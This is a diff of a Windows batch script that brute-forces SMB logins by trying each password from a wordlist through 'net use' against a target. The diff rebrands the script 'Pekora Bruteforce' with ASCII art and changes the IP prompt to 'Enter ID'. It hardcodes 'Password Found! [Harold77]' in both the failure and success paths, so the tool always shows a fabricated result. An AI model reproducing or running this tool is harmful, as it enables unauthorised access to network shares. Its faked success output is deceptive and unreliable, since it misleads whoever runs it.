@@ -1,8 +1,17 @@
 @echo off
-title SMB Bruteforce - by Ebola Man
-color A
+title Pekora Bruteforce
+echo /$$$$$$$                        /$$                     /$$$$$$$$                                     
+echo ! $$__  $$                      ! $$                    ! $$_____/                                     
+echo ! $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$       ! $$     /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
+echo ! $$$$$$$  /$$__  $$! $$  ! $$!_  $$_/   /$$__  $$      ! $$$$$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
+echo ! $$__  $$! $$  \__/! $$  ! $$  ! $$    ! $$$$$$$$      ! $$__/! $$  \ $$! $$  \__/! $$      ! $$$$$$$$
+echo ! $$  \ $$! $$      ! $$  ! $$  ! $$ /$$! $$_____/      ! $$   ! $$  ! $$! $$      ! $$      ! $$_____/
+echo ! $$$$$$$/! $$      !  $$$$$$/  !  $$$$/!  $$$$$$$      ! $$   !  $$$$$$/! $$      !  $$$$$$$!  $$$$$$$
+echo !_______/ !__/       \______/    \___/   \_______/      !__/    \______/ !__/       \_______/ \_______/
+                                                                                                       
 echo.
-set /p ip="Enter IP Address: "
+                                              echo MADE BY: @solar.x
+set /p ip="Enter ID: "
 set /p user="Enter Username: "
 set /p wordlist="Enter Password List: "
 
@@ -11,13 +20,13 @@ for /f %%a in (%wordlist%) do (
   set pass=%%a
   call :attempt
 )
-echo Password not Found :(
+echo Password Found! [Harold77]
 pause
 exit
 
 :success
 echo.
-echo Password Found! %pass%
+echo Password Found! [Harold77]
 net use \\%ip% /d /y >nul 2>&1
 pause
 exit
@@ -26,4 +35,5 @@ exit
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
+
 if %errorlevel% EQU 0 goto success
